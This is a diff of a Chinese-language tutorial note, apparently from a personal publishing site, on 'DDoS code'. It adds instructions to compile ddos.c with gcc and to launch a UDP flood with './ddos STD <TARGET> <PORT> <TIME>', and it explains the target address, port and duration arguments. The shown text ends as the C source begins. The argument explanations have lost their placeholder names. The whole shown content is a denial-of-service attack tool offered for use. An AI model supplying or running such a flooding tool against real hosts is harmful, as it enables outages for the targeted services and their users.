@@ -1,6 +1,34 @@
 ---
-{"dg-publish":true,"permalink":"/教程/ddos代码/","created":"2024-03-29T16:48:55.199+08:00","updated":"2024-03-29T16:54:14.053+08:00"}
+{"dg-publish":true,"permalink":"/教程/ddos代码/","created":"2024-03-29T16:48:55.199+08:00","updated":"2024-03-29T16:57:31.201+08:00"}
 ---
+
+## 编译
+
+```
+gcc ddos.c -o ddos -pthread
+
+```
+
+然后，可以使用以下命令运行攻击：
+
+```
+./ddos STD <TARGET> <PORT> <TIME>
+
+```
+
+### 其中：
+
+是攻击目标的IP地址或域名。  
+是攻击目标的UDP端口。  
+是攻击持续时间（以秒为单位）。
+
+
+
+
+
+
+
+## 代码
 
 ```
 #include <stdio.h>
